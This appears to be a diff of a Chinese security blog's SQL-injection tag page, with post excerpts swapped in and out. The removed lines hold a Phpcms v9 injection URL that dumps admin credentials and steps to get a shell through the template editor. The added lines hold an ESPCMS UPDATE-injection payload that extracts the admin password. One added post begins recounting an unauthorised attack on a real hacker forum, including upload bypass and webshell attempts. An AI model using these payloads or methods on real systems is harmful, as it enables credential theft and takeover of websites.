@@ -51,9 +51,9 @@
     
     
     | 
-    <a href='/tag/SQL注入/'>SQL注入</a>,
-    
     <a href='/tag/xss/'>xss</a>,
+    
+    <a href='/tag/SQL注入/'>SQL注入</a>,
     
     <a href='/tag/移动APP漏洞/'>移动APP漏洞</a>,
     
@@ -173,31 +173,50 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-09-07T04:33:36.000Z" itemprop="datePublished">
-          2012-09-07
+      <time datetime="2013-04-11T08:41:59.000Z" itemprop="datePublished">
+          2013-04-11
       </time>
     
     
     | 
+    <a href='/tag/漏洞/'>漏洞</a>,
+    
     <a href='/tag/SQL注入/'>SQL注入</a>,
     
-    <a href='/tag/0day/'>0day</a>,
-    
-    <a href='/tag/Phpcms/'>Phpcms</a>
+    <a href='/tag/Espcms/'>Espcms</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/808.seo/">Phpcms v9最新Sql注入0day(转自乌云)</a></h2>
+      <h2 class="post-title"><a href="/989.seo/">易思ESPCMS企业网站管理系统V5.6.13.04.03的会员中心模块SQL注入漏洞</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>在phpcms/api.php?op=add_favorite中使用了urldecode，导致了一个sqlinject漏洞。$title = urldecode($title);   <br />省略??    <br />$data = array(‘title’=&gt;$title, ‘url’=&gt;$url, ‘adddate’=&gt;SYS_TIME, ‘userid’=&gt;$userid);    <br />省略??    <br />$favorite_db-&gt;insert($data);    <br /></p>  <p>(需要你先注册一个账户并且登陆后访问那个接口文件才会报错,进而<a href="http://ha.cker.in/tag/SQL注入" target="_blank">注入</a>！）    <br />====================================================================    <br />利用POC：    <br />1、注册用户后，访问如下URL获取admin表的前缀：<a href="http://www.xxoo.com/api.php?op=add_favorite&amp;url=xx.oo&amp;title=%2527">http://www.xxoo.com/api.php?op=add_favorite&amp;url=xx.oo&amp;title=%2527</a>    <br />2、修改如下URL中的admin表前缀名(xxoo_admin)，直接爆出管理员的用户名:密码:随机字串    <br /><a href="http://www.xxoo.com/api.php?op=add_favorite&amp;url=xx.oo&amp;title=%2527%2520and%2520%2528select%25201%2520from%2528select%2520count%2528%252a%2529%252Cconcat%2528%2528select%2520%2528select%2520%2528select%2520concat%25280x23%252Ccast%2528concat%2528username%252C0x3a%252Cpassword%252C0x3a%252Cencrypt%2529%2520as%2520char%2529%252C0x23%2529%2520from%2520xxoo_admin%2520LIMIT%25200%252C1%2529%2529%2520from%2520information_schema.tables%2520limit%25200%252C1%2529%252Cfloor%2528rand%25280%2529%252a2%2529%2529x%2520from%2520information_schema.tables%2520group%2520by%2520x%2529a%2529%2520and%2520%25271%2527%253D%25271">http://www.xxoo.com/api.php?op=add_favorite&amp;url=xx.oo&amp;title=%2527%2520and%2520%2528select%25201%2520from%2528select%2520count%2528%252a%2529%252Cconcat%2528%2528select%2520%2528select%2520%2528select%2520concat%25280x23%252Ccast%2528concat%2528username%252C0x3a%252Cpassword%252C0x3a%252Cencrypt%2529%2520as%2520char%2529%252C0x23%2529%2520from%2520xxoo_admin%2520LIMIT%25200%252C1%2529%2529%2520from%2520information_schema.tables%2520limit%25200%252C1%2529%252Cfloor%2528rand%25280%2529%252a2%2529%2529x%2520from%2520information_schema.tables%2520group%2520by%2520x%2529a%2529%2520and%2520%25271%2527%253D%25271</a>    <br />MD5能破解    <br />后台拿shell    <br />进入后台后点击界面–模版风格–随便找个页面点击修改    <br />插入代码后点击提交..    <br />然后回到模版管理找到刚才修改的页面，点击 可视化..    <br /><a href="http://img.cker.in/Phpcmsv9Sql0day_120FB/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/Phpcmsv9Sql0day_120FB/clip_image001_thumb.jpg" width="339" height="318" /></a>    <br />恩，代码执行了</p>
+        <p><a href="http://ha.cker.in/tag/Espcms" target="_blank">Espcms</a> <a href="http://ha.cker.in/tag/SQL注入" target="_blank">SQL注入</a><a href="http://ha.cker.in/tag/漏洞" target="_blank">漏洞</a> 第二弹     <br /><a href="http://team.f4ck.net/thread-10337-1-1.html">http://team.f4ck.net/thread-10337-1-1.html</a></p>  <p>   <br />易思<a href="http://ha.cker.in/tag/Espcms" target="_blank">ESPCMS</a>企业网站管理系统基于LAMP开发构建的企业网站管理系统。     <br />易思<a href="http://ha.cker.in/tag/Espcms" target="_blank">ESPCMS</a>企业网站管理系统V5.6.13.04.03的会员中心模块存在<a href="http://ha.cker.in/tag/SQL注入" target="_blank">SQL注入</a>漏洞，攻击者可利用此漏洞破坏应用，执行未授权操作。</p>  <p>漏洞文件: interface/membermain.php    <br /></p>  <pre>function in_save() {<br>                parent::start_pagetemplate();<br>                parent::member_purview();<br>                $lng = (admin_LNG == ‘big5’) ? $this-&gt;CON[‘is_lancode’] : admin_LNG;<br>                $inputclass = $this-&gt;fun-&gt;accept(‘inputclass’, ‘R’);<br>                $upurl = $this-&gt;fun-&gt;accept(‘upurl’, ‘R’);<br>                $userid = intval($this-&gt;fun-&gt;accept(‘userid’, ‘P’));<br>                $username = $this-&gt;fun-&gt;accept(‘username’, ‘P’);<br>                if (empty($userid) || empty($username)) {<br>                        $linkURL = $this-&gt;mlink[‘center’];<br>                        $this-&gt;callmessage($this-&gt;lng[‘member_edit_ok’], $linkURL, $this-&gt;lng[‘gobackurlbotton’]);<br>                }<br>                $email = trim($this-&gt;fun-&gt;accept(‘email’, ‘P’));<br>                $question = trim($this-&gt;fun-&gt;accept(‘question’, ‘P’, true, true));<br>                $answer = trim($this-&gt;fun-&gt;accept(‘answer’, ‘P’, true, true));<br>                $alias = trim($this-&gt;fun-&gt;accept(‘alias’, ‘P’, true, true));//通过一个accept函数,确定为post提交<br>                $sex = $this-&gt;fun-&gt;accept(‘sex’, ‘P’);//注得就是你了.$sex可控,<br>                $sex = empty($sex) ? 0 : $sex;<br>                $tel = trim($this-&gt;fun-&gt;accept(‘tel’, ‘P’, true, true));<br>                $mobile = trim($this-&gt;fun-&gt;accept(‘mobile’, ‘P’, true, true));<br>                $birthday = $this-&gt;fun-&gt;accept(‘birthday’, ‘P’);<br>                $birthday = empty($birthday) ? 0 : $this-&gt;fun-&gt;formatdate($birthday, 4);<br>                $country = intval($this-&gt;fun-&gt;accept(‘cityone’, ‘P’));<br>                $country = empty($country) ? 0 : $country;<br>                $province = intval($this-&gt;fun-&gt;accept(‘citytwo’, ‘P’));<br>                $province = empty($province) ? 0 : $province;<br>                $city = intval($this-&gt;fun-&gt;accept(‘citythree’, ‘P’));<br>                $city = empty($city) ? 0 : $city;<br>                $district = intval($this-&gt;fun-&gt;accept(‘district’, ‘P’));<br>                $district = empty($district) ? 0 : $district;<br>                $address = trim($this-&gt;fun-&gt;accept(‘address’, ‘P’, true, true));<br>                $zipcode = trim($this-&gt;fun-&gt;accept(‘zipcode’, ‘P’, true, true));<br>                $zipcode = empty($zipcode) ? 0 : $zipcode;<br>                $msn = trim($this-&gt;fun-&gt;accept(‘msn’, ‘P’, true, true));<br>                $qq = $this-&gt;fun-&gt;accept(‘qq’, ‘P’);<br>                $qq = empty($qq) ? 0 : $qq;<br><br>                $db_table = db_prefix . ‘member’;<br>                $db_table2 = db_prefix . ‘member_value’;</pre><br><br><p>下面来看看怎么进行入库处理的吧。<br>  <br />$db_where = ‘userid=’ . $userid;<br><br>  <br />$db_set= &quot;sex=$sex,birthday=$birthday,country=$country,province=$province,city=$city,district=$district,alias=’$alias’,address=’$address’,zipcode=$zipcode,tel=’$tel’,mobile=’$mobile’,qq=$qq,msn=’$msn’&quot;;<br><br>  <br />$this-&gt;db-&gt;query(‘UPDATE ‘ . $db_table . ‘ SET ‘ . $db_set . ‘ WHERE ‘ . $db_where);</p>
+
+<p>Update注入,看了下数据库,address为varchar。</p>
+
+<p>因为这个cms有个防报错的函数,构造遇到了点麻烦,一出错就显示Can not connect to Mysql server,<br>  <br />&#160;</p>
+
+<p>追踪下此函数:<br>  <br /></p>
+
+<pre>function halt($message = '', $sql = '') { 
+                $db_err = !db_err ? 0 : db_err; 
+                $db_sql = !db_sql ? 0 : db_sql; 
+                $mysqlinfo = '&lt;font size=&quot;2&quot;&gt;&lt;b&gt;ESPCMS SQL Error:&lt;/b&gt; Can not connect to MySQL server&lt;b&gt;Time:&lt;/b&gt;' . date('e Y-m-d H-i-s', time()); 
+                $mysqlinfo.= $db_sql ? '&lt;b&gt;SQL:&lt;/b&gt;' . $sql : ''; 
+                $mysqlinfo.= $db_err ? '&lt;b&gt;Error：&lt;/b&gt;' . mysql_error() : ''; 
+                $mysqlinfo.= '&lt;a target=&quot;_blank&quot; href=&quot;http://www.espcms.com&quot;&gt;http://www.espcms.com&lt;/a&gt; Access Query Errors&lt;/font&gt;'; 
+
+                exit($mysqlinfo); 
+        }</pre>
+
+<p>为了方便构造, 把出错的sql语句和出错的提示都打印出来。<br>  <br />sex=1,birthday=2013-04-02,country=0,province=0,city=0,district=0,alias=1,address=(select concat(username,CHAR(0x7c),password) from espcms_admin_member limit 1),zipcode=0,tel=0,mobile=0,qq=0,msn=0/<em>&amp;birthday=2013-04-02&amp;cityone=0&amp;citytwo=0&amp;citythree=0&amp;district=0&amp;address=12&amp;zipcode=0&amp;tel=&amp;mobile=&amp;msn=&amp;qq=</em>/</p><br>
       
       </p>
       
       <p>
-          <a href="/808.seo/" class="excerpt-link">Read More...</a>
+          <a href="/989.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -206,27 +225,31 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-07-08T16:45:39.000Z" itemprop="datePublished">
-          2012-07-09
+      <time datetime="2013-04-01T00:56:51.000Z" itemprop="datePublished">
+          2013-04-01
       </time>
     
     
     | 
+    <a href='/tag/一句话/'>一句话</a>,
+    
+    <a href='/tag/xss/'>xss</a>,
+    
     <a href='/tag/SQL注入/'>SQL注入</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/669.seo/">十大关系数据库SQL注入工具一览</a></h2>
+      <h2 class="post-title"><a href="/987.seo/">对国外黑客论坛 hackerstown.com 的一次测试</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>众所周知，SQL注入攻击是最为常见的Web应用程序攻击技术。同时SQL注入攻击所带来的安全破坏也是不可弥补的。以下罗列的10款SQL工具可帮助管理员及时检测存在的漏洞。</p>  <p>BSQL Hacker</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/SQL_7AF6/clip_image001.jpg" width="594" height="558" /></p>  <p>BSQL Hacker是由Portcullis实验室开发的，BSQL Hacker 是一个SQL自动注入工具（支持SQL盲注），其设计的目的是希望能对任何的数据库进行SQL溢出注入。 BSQL Hacker的适用群体是那些对注入有经验的使用者和那些想进行自动SQL注入的人群。BSQL Hacker可自动对Oracle和MySQL数据库进行攻击，并自动提取数据库的数据和架构。</p>  <p>The Mole</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/SQL_7AF6/clip_image002.png" width="594" height="389" /></p>  <p>The Mole是一款开源的自动化SQL注入工具，其可绕过IPS/IDS（入侵防御系统/入侵检测系统）。只需提供一个URL和一个可用的关键字，它就能够检测注入点并利用。The Mole可以使用union注入技术和基于逻辑查询的注入技术。The Mole攻击范围包括SQL Server、MySQL、Postgres和Oracle数据库。</p>
+        <p><a href="http://img.cker.in/hackerstown.com_ED8E/clip_image001.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/hackerstown.com_ED8E/clip_image001_thumb.jpg" width="396" height="144" /></a></p>  <p>最近太忙了，一直没更新博客！先谈谈气候吧，尼玛南方冷死了！我现在是出门穿再多都哆嗦啊！</p>  <p>日，你什么时候来啊，我还是喜欢大热天吹电风扇，擦~ 大热天还可以裸睡，多爽！ </p>  <p>好吧，不扯谈了，对于为什么突然日这个站，其实还是前几天在看我网易博客的时候突然又看到之前一老外在&quot;<a href="http://ps.s.blog.163.com/blog/static/89878892201211311548478/">About EvilShad0w Team</a>&quot; 这篇日志下留言并留了个地址，如图：</p>  <p><a href="http://img.cker.in/hackerstown.com_ED8E/clip_image003.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/hackerstown.com_ED8E/clip_image003_thumb.jpg" width="381" height="212" /></a></p>  <p>前几天就看到这条评论，就点开了网址看见是个黑客论坛，版块内容还比较丰富，其中很多文章都还不错，突然试试入侵，于是先看他是什么程序吧。 通过分析论坛结构，确定为“MyBB”，于是通过之前收藏的一个国外exploit 公布站搜索了下这个程序，结果出来了很多 ，有<a href="http://ha.cker.in/tag/SQL注入" target="_blank">SQL注入</a>、信息泄露、<a href="http://ha.cker.in/tag/XSS" target="_blank">XSS</a>、远程代码执行。但一一试过，都无效。貌似已经打全补丁了。好吧，该我自己整合的字典上阵了！扫描完后发现路径都是一般常见的路径，我一一点击尝试访问都出现403 Forbidden，在访问其中 xxxx/的时候发现根路径泄露</p>  <p><a href="http://img.cker.in/hackerstown.com_ED8E/clip_image004.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/hackerstown.com_ED8E/clip_image004_thumb.jpg" width="336" height="51" /></a></p>  <p>还有目录遍历，然后再点击三级目录发现上传页面，只能浏览当前目录，并且禁止了上传，只能重命名文件还有写txt文件， 尼玛！ 我通过一个小页面写入txt文件，但是无法重命名，这时候我发给Liuker一起看，我俩啥后缀都试过了就是不能解析，一定是做限制了，在写文件的时候尝试跳目录也没成功，突然想到上传 .htaccess 来解析 jpg类似正常后缀突破，但是测试了下失败！Liuker用他字典扫到两个根目录的无内容PHP页面，通过一句话后门破解也没成功。My God…………<a href="http://img.cker.in/hackerstown.com_ED8E/clip_image005.gif"><img style="display: inline" title="clip_image005" alt="clip_image005" src="http://img.cker.in/hackerstown.com_ED8E/clip_image005_thumb.gif" width="19" height="19" /></a></p>  <p>继续吧，翻了翻当前的目录，发现了有几个压缩文件。</p><br>
       
       </p>
       
       <p>
-          <a href="/669.seo/" class="excerpt-link">Read More...</a>
+          <a href="/987.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -234,8 +257,8 @@
   
   <nav class="pagination" role="pagination">
     
-    <span class="page-number">Page 1 of 1</span>
-    
+    <span class="page-number">Page 1 of 2</span>
+    <a class="older-posts" href="/tag/SQL注入/page/2/">Older Posts →</a>
   </nav>
 </main>
 
